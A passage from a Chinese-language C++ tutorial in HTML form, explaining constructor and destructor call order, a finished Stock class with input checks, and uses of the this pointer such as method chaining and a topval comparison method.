class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123; <span class="comment">// 创建一个内部作用域</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Entering inner block ---\n&quot;</span>;</span><br><span class="line">        <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;Smart Comp&quot;</span>, <span class="number">50</span>, <span class="number">5.0</span>)</span></span>;</span><br><span class="line">        <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Great Gadgets&quot;</span>, <span class="number">10</span>, <span class="number">12.0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Exiting inner block ---\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 当离开这个作用域时，stock2 和 stock1 (按相反顺序创建) 会被销毁</span></span><br><span class="line">    &#125; <span class="comment">// stock2 的析构函数先调用，然后是 stock1 的</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Creating dynamic stock ---\n&quot;</span>;</span><br><span class="line">    Stock *p_stock = <span class="keyword">new</span> Stock(<span class="string">&quot;Dynamic Duo&quot;</span>, <span class="number">25</span>, <span class="number">2.5</span>);</span><br><span class="line">    p_stock-&gt;show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Deleting dynamic stock ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_stock; <span class="comment">// 调用析构函数，然后释放内存</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- main() is ending ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>可能的输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--- Entering inner block ---</span><br><span class="line">Constructor using Smart Comp called</span><br><span class="line">Constructor using Great Gadgets called</span><br><span class="line">--- Exiting inner block ---</span><br><span class="line">Bye, Great Gadgets!</span><br><span class="line">Bye, Smart Comp!</span><br><span class="line">--- Creating dynamic stock ---</span><br><span class="line">Constructor using Dynamic Duo called</span><br><span class="line">Company: Dynamic Duo  Shares: 25</span><br><span class="line">  Share Price: $2.500  Total Worth: $62.50</span><br><span class="line">--- Deleting dynamic stock ---</span><br><span class="line">Bye, Dynamic Duo!</span><br><span class="line">--- main() is ending ---</span><br></pre></td></tr></table></figure><p>注意析构函数调用的时机和顺序（对于局部对象，与构造顺序相反）。</p><h3 id="10-3-5-改进-Stock-类"><a href="#10-3-5-改进-Stock-类" class="headerlink" title="10.3.5 改进 Stock 类"></a>10.3.5 改进 Stock 类</h3><p>现在，我们可以整合构造函数和析构函数，得到一个更完善（虽然在这个例子中析构函数作用不大）的 <code>Stock</code> 类。</p><p><strong>stock.h (最终版本)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\stock.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STOCK_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOCK_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    Stock(); <span class="comment">// 默认构造函数</span></span><br><span class="line">    Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n = <span class="number">0</span>, <span class="keyword">double</span> pr = <span class="number">0.0</span>);</span><br><span class="line">    <span class="comment">// 析构函数</span></span><br><span class="line">    ~Stock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STOCK_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>stock.cpp (最终版本)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\stock.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数定义</span></span><br><span class="line">Stock::Stock() &#123;</span><br><span class="line">    company = <span class="string">&quot;no name&quot;</span>;</span><br><span class="line">    shares = <span class="number">0</span>;</span><br><span class="line">    share_val = <span class="number">0.0</span>;</span><br><span class="line">    total_val = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stock::Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr) &#123;</span><br><span class="line">    company = co;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>; <span class="comment">// 使用 cerr 输出错误</span></span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 析构函数定义</span></span><br><span class="line">Stock::~Stock() &#123;</span><br><span class="line">    <span class="comment">// 在这个简单类中，析构函数体可以为空</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Destructor called for &quot; &lt;&lt; company &lt;&lt; &quot;\n&quot;; // 可以取消注释来观察</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他成员函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 iomanip 来设置格式可能更清晰</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-3-6-构造函数和析构函数小结"><a href="#10-3-6-构造函数和析构函数小结" class="headerlink" title="10.3.6 构造函数和析构函数小结"></a>10.3.6 构造函数和析构函数小结</h3><ul><li><strong>构造函数:</strong><ul><li>  与类同名，无返回类型。</li><li>  在创建对象时自动调用，用于初始化对象。</li><li>  可以重载（提供不同的参数列表）。</li><li>  如果没有定义任何构造函数，编译器会生成一个默认构造函数（无参数，什么也不做）。</li><li>  如果定义了任何构造函数，编译器不再生成默认构造函数；如果需要无参数构造，必须自己定义。</li></ul></li><li><strong>析构函数:</strong><ul><li>  类名前加 <code>~</code>，无返回类型，无参数。</li><li>  在对象销毁时自动调用，用于清理资源。</li><li>  不能重载，一个类只有一个析构函数。</li><li>  如果类中使用了 <code>new</code> 分配资源，通常需要在析构函数中使用 <code>delete</code> 来释放。</li></ul></li></ul><p>构造函数和析构函数是 C++ 类机制的重要组成部分，它们确保了对象的正确初始化和资源的安全释放，是实现<strong>资源获取即初始化 (RAII - Resource Acquisition Is Initialization)</strong> 这一重要 C++ 编程范式的基石。</p><h2 id="10-4-this-指针"><a href="#10-4-this-指针" class="headerlink" title="10.4 this 指针"></a>10.4 this 指针</h2><p>在 C++ 类的成员函数内部，你有时可能需要引用<strong>调用该函数的对象本身</strong>。例如，当你在 <code>stock1.show()</code> 的实现代码中，如何明确地指代 <code>stock1</code> 这个对象？C++ 为此提供了一个特殊的指针，称为 <code>this</code> 指针。</p><h3 id="this-指针是什么？"><a href="#this-指针是什么？" class="headerlink" title="this 指针是什么？"></a><code>this</code> 指针是什么？</h3><p><code>this</code> 是一个隐含的指针，它存在于每个<strong>非静态成员函数</strong>（non-static member function）内部。它指向<strong>调用该成员函数的那个对象</strong>。</p><ul><li>  当你调用 <code>stock1.show()</code> 时，在 <code>show()</code> 函数的内部，<code>this</code> 指针就指向 <code>stock1</code> 对象。</li><li>  当你调用 <code>stock2.buy(..)</code> 时，在 <code>buy()</code> 函数的内部，<code>this</code> 指针就指向 <code>stock2</code> 对象。</li></ul><p>编译器在调用成员函数时，会隐式地将对象的地址传递给该函数，这个地址就被 <code>this</code> 指针所持有。</p><p><strong>关键点：</strong></p><ol><li> <strong>隐含参数:</strong> <code>this</code> 指针是作为隐含参数传递给非静态成员函数的。你不需要在函数参数列表中显式声明它。</li><li> <strong>指向调用对象:</strong> 它总是指向当前正在执行其成员函数的那个对象。</li><li> <strong>类型:</strong> <code>this</code> 指针的类型是 <code>ClassName * const</code>（对于非 <code>const</code> 成员函数）或 <code>const ClassName * const</code>（对于 <code>const</code> 成员函数）。这意味着 <code>this</code> 指针本身是一个常量指针（不能让它指向其他对象），并且对于 <code>const</code> 成员函数，它指向一个 <code>const</code> 对象（不能通过 <code>this</code> 修改对象的数据成员）。</li><li> <strong>访问成员:</strong> 在成员函数内部，当你直接访问数据成员（如 <code>shares</code>）或调用其他成员函数（如 <code>set_tot()</code>）时，实际上是编译器隐式地使用了 <code>this</code> 指针，等同于 <code>this-&gt;shares</code> 或 <code>this-&gt;set_tot()</code>。</li></ol><h3 id="使用-this-指针"><a href="#使用-this-指针" class="headerlink" title="使用 this 指针"></a>使用 <code>this</code> 指针</h3><p>大多数情况下，你不需要显式地使用 <code>this</code> 指针，因为编译器会自动处理。例如，在 <code>Stock::buy</code> 函数中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// shares += num;       // 隐式使用 this-&gt;shares</span></span><br><span class="line">        <span class="comment">// share_val = price; // 隐式使用 this-&gt;share_val</span></span><br><span class="line">        <span class="comment">// set_tot();         // 隐式调用 this-&gt;set_tot()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面是显式使用 this 的等效写法：</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;shares += num;</span><br><span class="line">        <span class="keyword">this</span>-&gt;share_val = price;</span><br><span class="line">        <span class="keyword">this</span>-&gt;set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而，在某些特定场景下，显式使用 <code>this</code> 指针是必要的或有用的：</p><ol><li><p><strong>区分同名参数和成员:</strong> 当成员函数的参数名与数据成员名相同时，需要使用 <code>this-&gt;</code> 来明确指定访问的是数据成员。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 参数名 value 与数据成员 value 相同</span></span><br><span class="line">    Example(<span class="keyword">int</span> value) &#123;</span><br><span class="line">        <span class="comment">// 必须使用 this-&gt;value 来引用数据成员</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;value = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125; <span class="comment">// 这里访问的是成员 value</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Example <span class="title">ex</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 调用构造函数</span></span><br><span class="line">    ex.print();     <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <em>(虽然这种命名方式有时会用到，但一些编码规范建议避免参数名和成员名完全相同，例如使用 <code>m_value</code> 或 <code>value_</code> 作为成员名)</em></p></li><li><p><strong>返回对象自身的引用或指针:</strong> 当成员函数需要返回调用该函数的对象本身时（通常是为了支持**方法链式调用 (Method Chaining)**）。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Counter&amp; <span class="title">increment</span><span class="params">()</span> </span>&#123; <span class="comment">// 返回类型是 Counter&amp;</span></span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用对象自身的引用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Counter&amp; <span class="title">add</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; <span class="comment">// 返回类型是 Counter&amp;</span></span><br><span class="line">        count += val;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用对象自身的引用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Counter c;</span><br><span class="line">    c.display(); <span class="comment">// Output: Count: 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法链式调用</span></span><br><span class="line">    c.increment().add(<span class="number">5</span>).increment(); <span class="comment">// 先调用 increment(), 返回 c 的引用；</span></span><br><span class="line">                                      <span class="comment">// 再对 c 调用 add(5), 返回 c 的引用；</span></span><br><span class="line">                                      <span class="comment">// 最后对 c 调用 increment()</span></span><br><span class="line"></span><br><span class="line">    c.display(); <span class="comment">// Output: Count: 7</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在 <code>increment()</code> 和 <code>add()</code> 中，<code>return *this;</code> 返回的是调用对象（<code>c</code>）的引用，使得可以在其后继续调用该对象的其他成员函数。</p></li><li><p> <strong>在友元函数或独立函数中传递对象:</strong> 虽然 <code>this</code> 本身只在成员函数内可用，但你可以将 <code>*this</code>（对象本身）或 <code>this</code>（对象地址）传递给需要操作该对象的其他函数。</p></li></ol><h3 id="this-与-Stock-类"><a href="#this-与-Stock-类" class="headerlink" title="this 与 Stock 类"></a><code>this</code> 与 <code>Stock</code> 类</h3><p>让我们看看 <code>this</code> 如何应用于之前的 <code>Stock</code> 类。假设我们想添加一个方法，用于比较两个 <code>Stock</code> 对象的总价值，并返回总价值较高的那个对象的引用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.h 的类定义中添加声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors, destructor, buy, sell, update, show ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新增方法：比较总价值，返回价值更高的对象的引用</span></span><br><span class="line">    <span class="comment">// 第一个const（返回值前）：表示返回的引用是常量，不能被修改</span></span><br><span class="line">    <span class="comment">// 第二个const（参数中）  ：表示参数是常量引用，函数内不能修改参数</span></span><br><span class="line">    <span class="comment">// 第三个const（函数末尾）：表示这是一个常量成员函数，不能修改调用对象的成员变量</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> Stock&amp; <span class="title">topval</span><span class="params">(<span class="keyword">const</span> Stock&amp; s)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 stock.cpp 中添加定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 其他定义 ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 topval 方法</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> Stock&amp; <span class="title">Stock::topval</span><span class="params">(<span class="keyword">const</span> Stock&amp; s)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// this-&gt;total_val 是调用该方法的对象 (e.g., stock1) 的总价值</span></span><br><span class="line">    <span class="comment">// s.total_val 是传入的参数对象 (e.g., stock2) 的总价值</span></span><br><span class="line">    <span class="keyword">if</span> (s.total_val &gt; <span class="keyword">this</span>-&gt;total_val) &#123;</span><br><span class="line">        <span class="keyword">return</span> s; <span class="comment">// 返回传入的对象 s</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用该方法的对象自身 (*this)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意：函数声明和定义末尾的 const 表示此函数不会修改任何 Stock 对象，</span></span><br><span class="line">    <span class="comment">// 因此 this 的类型是 const Stock* const，*this 的类型是 const Stock&amp;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用示例</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;Company A&quot;</span>, <span class="number">100</span>, <span class="number">10.0</span>)</span></span>; <span class="comment">// total_val = 1000.0</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Company B&quot;</span>, <span class="number">50</span>, <span class="number">25.0</span>)</span></span>;  <span class="comment">// total_val = 1250.0</span></span><br><span class="line"></span><br><span class="line">    stock1.show();</span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Stock&amp; top = stock1.topval(stock2); <span 